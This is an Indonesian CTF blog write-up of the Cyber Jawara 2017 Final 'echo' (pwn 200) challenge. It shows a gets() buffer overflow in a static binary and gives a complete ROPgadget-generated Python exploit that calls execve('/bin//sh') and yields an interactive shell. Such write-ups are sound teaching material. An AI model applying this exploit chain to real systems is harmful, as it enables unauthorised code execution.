@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Cyber Jawara 2017 Final - echo (pwn 200)</title>
+  <meta name="description" content="Diberikan sebuah file elf binary 64 bit dengan nama echo$ file echoecho: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU...">
+  
+  <meta name="author" content="rhama">
+  <meta name="copyright" content="&copy; rhama 2017">
+  
+
+  <!-- External libraries -->
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">
+
+  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
+  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
+  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
+  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
+  <link rel="manifest" href="/assets/icons/manifest.json">
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  
+  <!-- Facebook OGP cards -->
+  <meta property="og:description" content="Diberikan sebuah file elf binary 64 bit dengan nama echo$ file echoecho: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU..." />
+  <meta property="og:url" content="https://rhama.my.id/ctf/2017/11/20/cyber-jawara-2017-final-pwn200.html" />
+  <meta property="og:site_name" content="CTF.Ninja" />
+  <meta property="og:title" content="Cyber Jawara 2017 Final - echo (pwn 200)" />
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="https://rhama.my.id/assets/images/CTF.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="612" />
+  <meta property="og:image:height" content="605" />
+  
+
+  
+  <!-- Twitter: card tags -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Cyber Jawara 2017 Final - echo (pwn 200)">
+  <meta name="twitter:description" content="Diberikan sebuah file elf binary 64 bit dengan nama echo$ file echoecho: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU...">
+  <meta name="twitter:image" content="https://rhama.my.id/assets/images/CTF.png">
+  <meta name="twitter:url" content="https://rhama.my.id/ctf/2017/11/20/cyber-jawara-2017-final-pwn200.html">
+  
+
+  
+
+  <!-- Site styles -->
+  <link rel="stylesheet" href="/css/main.css">
+   <link rel="stylesheet" href="/css/terminal.css">
+  <link rel="canonical" href="https://rhama.my.id/ctf/2017/11/20/cyber-jawara-2017-final-pwn200.html">
+  <link rel="alternate" type="application/rss+xml" title="CTF.Ninja" href="https://rhama.my.id/feed.xml" />
+</head>
+
+
+  <body>
+
+    <header class="navigation" role="banner">
+  <div class="navigation-wrapper">
+    <a href="/" class="logo">
+      
+      <img src="/assets/logo.png" alt="CTF.Ninja">
+      
+    </a>
+    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
+      <i class="fa fa-bars"></i>
+    </a>
+    <nav role="navigation">
+      <ul id="js-navigation-menu" class="navigation-menu show">
+        
+          
+          <li class="nav-link"><a href="/about/">About</a>
+          
+        
+          
+          <li class="nav-link"><a href="/posts/">Archives</a>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+        <div class="post">
+
+<div class="post-header-container has-cover" style="background-image: url(/assets/images/CTF.png);">
+  <div class="scrim has-cover">
+    <header class="post-header">
+      <h1 class="title">Cyber Jawara 2017 Final - echo (pwn 200)</h1>
+      <p class="info">by <strong>CTF.Ninja</strong></p>
+    </header>
+  </div>
+</div>
+
+<div class="wrapper">
+
+
+
+<section class="post-meta">
+  <div class="post-date">November 20, 2017</div>
+  <div class="post-categories">
+  in 
+    
+    <a href="/category/CTF">Ctf</a>
+    
+  
+  </div>
+</section>
+
+<article class="post-content">
+  <article class="post-content">
+<p><img class="size-medium aligncenter" src="http://acehraya.co.id/wp-content/uploads/2015/09/codepolitan-header-cyber-jawara2.png" width="700" height="350" /></p>
+<p>Diberikan sebuah file elf binary 64 bit dengan nama echo</p>
+<pre style="background:#000;color:#f8f8f8;">$ file <span style="color:#dad085;">echo</span>
+<span style="color:#dad085;">echo</span>: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, <span style="color:#e28964;">for</span> <span style="color:#3e87e3;">GNU/Linux</span> 2.6.32, BuildID[sha1]=c5e63f048eccc18550211a8582dd02c44874ba61, stripped
+</pre>
+<p>Dengan proteksi sebagai berikut</p>
+<pre style="background:#000;color:#f8f8f8;">$ checksec <span style="color:#dad085;">echo</span>
+[<span style="color:#e28964;">*</span>] <span style="color:#65b042;">'echo'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</pre>
+<p>Berikut adalah hasil decompile menggunakan IDA pro</p>
+<pre style="background:#000;color:#f8f8f8;"><span style="color:#99cf50;">int</span> __cdecl <span style="color:#89bdff;">main</span>(int argc, const char **argv, const char **envp)
+{
+  char v4; // [sp+0h] [bp-2710h]@1
+  welcome_msg();
+  gets(&amp;v4);
+  return foo((__int64)&amp;v4);
+}
+</pre>
+<p>Dari hasil decompile IDA pro dipastikan binary tersebut vulnerable terhadap Buffer Overflow karena menggunakan fungsi “gets()” yang tidak memfilter panjang inputan.</p>
+<p>Dengan asumsi bahwa ASLR pada mesin dalam keadaan ON dan binary tersebut di proteksi dengan NX bit yang tidak memungkinkan untuk eksekusi shellcode, sehingga teknik yang digunakan adalah ROP ( Return Oriented Programming).</p>
+<p>Sebelumnya, ukuran buffer variable v4 yang menyimpan inputan user adalah 0x2710 (10000) bytes (terlihat pada bp-2710h). Dan dibutuhkan 10000 + 8 bytes untuk mengoverwrite RIP.</p>
+<p>Karena binary tersebut dicompile dengan flag ( -static ) static binary, pembuatan gadget bisa di automasi menggunakan “ROPgadget” untuk generate ropchain.</p>
+<pre style="background:#000;color:#f8f8f8;">$ ROPgadget --binary <span style="color:#dad085;">echo</span> --ropchain
+</pre>
+<p>Berikut exploit code dari ropchain yang digenerate ROPgadget dan disesuikan dengan ukuran buffer untuk overwrite RIP.</p>
+<pre style="background:#000;color:#f8f8f8;"><span style="color:#aeaeae;font-style:italic;">#!/usr/bin/env python2</span>
+<span style="color:#aeaeae;font-style:italic;"># execve generated by ROPgadget</span>
+
+<span style="color:#e28964;">from</span> struct <span style="color:#e28964;">import</span> pack
+
+<span style="color:#aeaeae;font-style:italic;"># Padding goes here</span>
+p <span style="color:#e28964;">=</span> <span style="color:#65b042;">'A'</span> <span style="color:#e28964;">*</span> <span style="color:#3387cc;">10008</span>
+
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000401817</span>) <span style="color:#aeaeae;font-style:italic;"># pop rsi ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x00000000006cb080</span>) <span style="color:#aeaeae;font-style:italic;"># @ .data</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000479ce6</span>) <span style="color:#aeaeae;font-style:italic;"># pop rax ; pop rdx ; pop rbx ; ret</span>
+p <span style="color:#e28964;">+=</span> <span style="color:#65b042;">'/bin//sh'</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x4141414141414141</span>) <span style="color:#aeaeae;font-style:italic;"># padding</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x4141414141414141</span>) <span style="color:#aeaeae;font-style:italic;"># padding</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x00000000004755c1</span>) <span style="color:#aeaeae;font-style:italic;"># mov qword ptr [rsi], rax ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000401817</span>) <span style="color:#aeaeae;font-style:italic;"># pop rsi ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x00000000006cb088</span>) <span style="color:#aeaeae;font-style:italic;"># @ .data + 8</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x000000000042695f</span>) <span style="color:#aeaeae;font-style:italic;"># xor rax, rax ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x00000000004755c1</span>) <span style="color:#aeaeae;font-style:italic;"># mov qword ptr [rsi], rax ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x00000000004005d5</span>) <span style="color:#aeaeae;font-style:italic;"># pop rdi ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x00000000006cb080</span>) <span style="color:#aeaeae;font-style:italic;"># @ .data</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000401817</span>) <span style="color:#aeaeae;font-style:italic;"># pop rsi ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x00000000006cb088</span>) <span style="color:#aeaeae;font-style:italic;"># @ .data + 8</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000442d86</span>) <span style="color:#aeaeae;font-style:italic;"># pop rdx ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x00000000006cb088</span>) <span style="color:#aeaeae;font-style:italic;"># @ .data + 8</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x000000000042695f</span>) <span style="color:#aeaeae;font-style:italic;"># xor rax, rax ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000467920</span>) <span style="color:#aeaeae;font-style:italic;"># add rax, 1 ; ret</span>
+p <span style="color:#e28964;">+=</span> pack(<span style="color:#65b042;">'&lt;Q'</span>, <span style="color:#3387cc;">0x0000000000468475</span>) <span style="color:#aeaeae;font-style:italic;"># syscall ; ret</span>
+<span style="color:#e28964;">print</span> p
+</pre>
+<p>Jalankan script nya.</p>
+<pre style="background:#000;color:#f8f8f8;">(python exp.py<span style="color:#e28964;">;</span> cat) <span style="color:#e28964;">|</span> ./echo
+</pre>
+<p>Setelah itu akan mendapatkan interactive shell.</p>
+</article>
+
+</article>
+
+
+
+<section class="tags">
+  <strong>Tags:</strong> <a href="/tag/CyberJawara2017">CyberJawara2017</a>,&nbsp;<a href="/tag/CTF">CTF</a>
+</section>
+
+
+
+<section class="rss">
+  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
+</section>
+
+<section class="share">
+  <span>Share: </span>
+  
+    
+    
+    
+      <a href="//www.facebook.com/sharer.php?t=Cyber+Jawara+2017+Final+-+echo+%28pwn+200%29&u=https%3A%2F%2Frhama.my.id%2Fctf%2F2017%2F11%2F20%2Fcyber-jawara-2017-final-pwn200.html"
+        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
+        <i class="fa fa-facebook-square fa-lg"></i>
+      </a>
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+      <a href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent('https://rhama.my.id/ctf/2017/11/20/cyber-jawara-2017-final-pwn200.html') + '&title=Cyber Jawara 2017 Final - echo (pwn 200)'; return false">
+        <i class="fa fa-reddit-square fa-lg"></i>
+      </a>
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+</section>
+
+
+
+
+</div>
+</div>
+
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h3 class="footer-heading">CTF.Ninja</h3>
+
+    <div class="site-navigation">
+
+      <p><strong>Site Map</strong></p>
+      <ul class="pages">
+        
+        
+          <li class="nav-link"><a href="/about/">About</a>
+        
+        
+        
+          <li class="nav-link"><a href="/posts/">Archives</a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+      </ul>
+    </div>
+
+    <div class="site-contact">
+
+      <p><strong>Contact</strong></p>
+      <ul class="social-media-list">
+        <li>
+          <a href="mailto:r4m@protonmail.com">
+            <i class="fa fa-envelope-o"></i>
+            <span class="username">r4m@protonmail.com</span>
+          </a>
+        </li>
+
+        
+          
+          <li>
+            <a href="https://www.facebook.com/eat.sleep.pwn.repeat" title="Friend me on Facebook">
+              <i class="fa fa-facebook"></i>
+              <span class="username">eat.sleep.pwn.repeat</span>
+            </a>
+          </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+
+      </ul>
+    </div>
+
+    <div class="site-signature">
+      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
+      <p class="text">CTF, InfoSec, Banana And More.
+</p>
+    </div>
+
+  </div>
+
+</footer>
+
+<!-- Scripts -->
+<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function() {
+  // Default syntax highlighting
+  hljs.initHighlightingOnLoad();
+
+  // Header
+  var menuToggle = $('#js-mobile-menu').unbind();
+  $('#js-navigation-menu').removeClass("show");
+  menuToggle.on('click', function(e) {
+    e.preventDefault();
+    $('#js-navigation-menu').slideToggle(function(){
+      if($('#js-navigation-menu').is(':hidden')) {
+        $('#js-navigation-menu').removeAttr('style');
+      }
+    });
+  });
+});
+
+</script>
+
+
+
+
+
+
+  </body>
+
+</html>
